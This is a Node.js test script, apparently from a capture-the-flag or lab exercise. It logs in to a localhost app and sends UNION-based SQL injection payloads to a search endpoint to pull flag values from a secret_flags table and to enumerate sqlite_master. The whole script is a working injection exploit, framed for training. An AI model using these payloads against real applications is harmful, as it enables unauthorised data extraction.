// SQL Injection Test Script
// This script demonstrates the SQL injection vulnerability in the application
// Run this after starting the application and creating a user account

const axios = require('axios');

// Configuration
const BASE_URL = 'http://localhost:5000';
let authToken = '';

// Test SQL injection payloads
const payloads = [
  // Basic union injection to see table structure
  "' UNION SELECT 1,2,3,4,5 FROM secret_flags --",
  
  // Extract the flag
  "' UNION SELECT 1,flag_name,flag_value,description,5 FROM secret_flags --",
  
  // Alternative payload
  "' UNION SELECT 1,2,3,4,5 FROM sqlite_master WHERE type='table' --",
  
  // More specific flag extraction
  "' UNION SELECT 1,'FLAG',flag_value,'DESCRIPTION',5 FROM secret_flags WHERE flag_name='sql_injection' --"
];

async function testSQLInjection() {
  console.log('🔍 Testing SQL Injection Vulnerability\n');
  
  try {
    // First, we need to login to get a token
    console.log('1. Attempting to login...');
    const loginResponse = await axios.post(`${BASE_URL}/api/login`, {
      username: 'testuser', // Replace with actual username
      password: 'testpass'  // Replace with actual password
    });
    
    authToken = loginResponse.data.token;
    console.log('✅ Login successful, token obtained\n');
    
    // Test each payload
    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      console.log(`2. Testing payload ${i + 1}: ${payload}`);
      
      try {
        const response = await axios.get(`${BASE_URL}/api/search`, {
          params: { query: payload },
          headers: { Authorization: `Bearer ${authToken}` }
        });
        
        console.log('✅ Response received:');
        console.log(JSON.stringify(response.data, null, 2));
        
        // Check if we got the flag
        if (response.data && Array.isArray(response.data)) {
          const flagEntry = response.data.find(item => 
            item.flag_value && item.flag_value.includes('ninja{')
          );
          
          if (flagEntry) {
            console.log('\n🎉 FLAG FOUND! 🎉');
            console.log(`Flag: ${flagEntry.flag_value}`);
            console.log(`Description: ${flagEntry.description}`);
          }
        }
        
      } catch (error) {
        console.log('❌ Error with payload:', error.response?.data || error.message);
      }
      
      console.log('---\n');
    }
    
  } catch (error) {
    console.log('❌ Login failed:', error.response?.data || error.message);
    console.log('\nMake sure to:');
    console.log('1. Start the application');
    console.log('2. Create a user account first');
    console.log('3. Update the username/password in this script');
  }
}

// Instructions
console.log('SQL Injection Vulnerability Test Script');
console.log('=====================================\n');
console.log('Before running this script:');
console.log('1. Start the application: npm run dev');
console.log('2. Create a user account through the web interface');
console.log('3. Update the username/password in this script');
console.log('4. Install axios: npm install axios');
console.log('\nThen run: node test_sql_injection.js\n');

// Run the test
testSQLInjection();
